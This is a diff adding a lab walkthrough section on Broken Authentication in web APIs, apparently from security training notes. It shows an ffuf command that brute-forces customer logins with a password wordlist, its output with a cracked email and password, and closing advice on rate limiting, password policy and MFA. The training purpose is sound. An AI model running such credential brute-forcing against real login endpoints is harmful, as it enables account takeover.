@@ -106,3 +106,95 @@ done
 
 To mitigate the BOLA vuln, the endpoint `/api/v1/supplier-companies/yearly-reports` should implement a verification step to ensure that authorized users can only access yearly reports associated with their affiliated company. This verification involves comparing the `companyID` field of the report with the authenticated supplier's `companyID`. Access should be granted only if these values match; otherwise, the request should be denied. This approach effectively maintains data segregation between supplier-companies' yearly reports.
 
+### Broken Authentication
+
+Web APIs utilize various authentication mechanisms to ensure data confidentiality. An API suffers from Broken Authentication if any of its authentication mechanisms can be bypassed or circumvented.
+
+#### [Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
+
+Utilize the `/api/v1/authentication/customers/sign-in` endpoint to obtain a JWT and then authenticate with it:
+
+![api owasp 11](../../../../images/api_owasp11.png)
+
+When invoking the `/api/v1/customers/current-user` endpoint, you get back the information of your currently authenticated user:
+
+![api owasp 12](../../../../images/api_owasp12.png)
+
+The `/api/v1/roles/current-user` endpoint reveals that the user is assigned three roles: `Customers_UpdateByCurrentUser`, `Customers_Get`, and `Customers_GetAll`.
+
+![api owasp 13](../../../../images/api_owasp13.png)
+
+`Customers_GetAll` allows you to use the `/api/v1/customers` endpoint, which returns the records of all customers:
+
+![api owasp 14](../../../../images/api_owasp14.png)
+
+Although the endpoint suffers from Broken Object Property Level Authorization because it exposes sensitive information about other customers, such as email, phone number, and birthdate, it does not directly allow you to hijack any other account.
+
+When you expand the `/api/v1/customers/current-user` `PATCH` endpoint, you discover that it allows you to update your information fields, including the account's password:
+
+![api owasp 15](../../../../images/api_owasp15.png)
+
+If you provide a weak password such as "pass", the API rejects the update, stating that passwords must be at least six chars long:
+
+![api owasp 16](../../../../images/api_owasp16.png)
+
+The validation message provides valuable information, exposing that the API uses a weak password policy, which does not enforce cryptographically secure passwords. If you try setting the password to "123456", you will notice the API now returns `true` for the success status, indicating that it performed the update:
+
+![api owasp 17](../../../../images/api_owasp17.png)
+
+Given that the API uses a weak password policy, other customer accounts could have used cryptographically insecure passwords when registering. Therefore, you will perform a password brute-forcing against customers using ffuf.
+
+First, you need to obtain the (_fail_) message that the `/api/v1/authentication/customers/sign-in` endpoint returns when provided with incorrect credentials, which in this case is "Invalid Credentials".
+
+![api owasp 18](../../../../images/api_owasp18.png)
+
+Because you are fuzzing two parameters at the same time, you need to use the `-w` flag and assign the keywords `EMAIL` and `PASS` to the customer and passwords wordlists, respectively. Once ffuf finishes, you will discover that the password of `IsabellaRichardson@gmail.com` is `qwerasdfzxcv`:
+
+```bash
+d41y@htb[/htb]$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://94.237.59.63:31874/api/v1/authentication/customers/sign-in
+ :: Wordlist         : PASS: /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt
+ :: Wordlist         : EMAIL: /home/htb-ac-413848/customerEmails.txt
+ :: Header           : Content-Type: application/json
+ :: Data             : {"Email": "EMAIL", "Password": "PASS"}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: Invalid Credentials
+________________________________________________
+
+[Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]
+    * EMAIL: IsabellaRichardson@gmail.com
+    * PASS: qwerasdfzxcv
+
+:: Progress: [30000/30000] :: Job [1/1] :: 1275 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
+```
+
+Now that you have brute-forced the password, you can use the `/api/v1/authentication/customers/sign-in` endpoint with the credentials `IsabellaRichardson@gmail.com:qwerasdfzxcv` to otbain a JWT as `Isabella` and view all her confidential information.
+
+#### Brute-Forcing OTPs and Answers of Security Questions
+
+Applications allow users to reset their passwords by requesting a OTP sent to a device they own or answering a security question they have chosen during registration. If brute-forcing passwords is infeasible due to strong password policies, you can attempt to brute-force OTPs or answers to security questions, given that they have low entropy or can be guessed.
+
+#### Prevention
+
+To mitigate the Broken Authentication vuln, the `/api/v1/authentication/customers/sign-in` endpoint should implement rate-limiting to prevent brute-force attacks. This can be achieved by limiting the number of login attempts from a single IP address or user account within a specified time frame.
+
+Moreover, the web API should enforce a robust password policy for user credentials during both registration and updates, allowing only cryptographically secure passwords.
+
+Additionally, the web API endpoint should implement multi-factor authentication for added security, requesting an OTP before fully authenticating users.
+
